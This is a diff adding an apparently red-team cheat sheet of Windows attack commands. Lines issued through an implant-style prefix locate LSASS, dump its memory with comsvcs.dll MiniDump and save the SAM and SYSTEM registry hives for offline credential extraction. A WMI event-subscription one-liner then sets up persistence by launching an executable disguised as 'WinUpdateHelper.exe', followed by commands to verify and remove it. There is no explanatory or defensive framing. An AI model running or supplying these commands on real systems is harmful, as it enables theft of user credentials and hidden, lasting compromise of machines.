@@ -1,0 +1,19 @@
+!shell tasklist | findstr lsass
+!uacbypass rundll32 C:\Windows\System32\comsvcs.dll, MiniDump 1200 C:\temp\lsass.dmp full
+!uacbypass reg save hklm\sam C:\temp\sam.save
+!uacbypass reg save hklm\system C:\temp\system.save
+
+-----------------------
+
+ONE LINER PERSISTANCE WMI
+
+$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name="TestFilter";EventNamespace="root\cimv2";QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}; $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name="TestConsumer";CommandLineTemplate="C:\Users\Salamander69\Desktop\WinUpdateHelper.exe"}; Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter;Consumer=$consumer}
+
+VERIFY 
+
+Get-WMIObject -Namespace root\subscription -Class __EventFilter | Select-Object Name, Query
+Get-WMIObject -Namespace root\subscription -Class CommandLineEventConsumer | Select-Object Name, CommandLineTemplate
+
+CLEAN 
+
+Get-WMIObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.Name -eq "TestFilter"} | Remove-WmiObject; Get-WMIObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object {$_.Name -eq "TestConsumer"} | Remove-WmiObject; Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
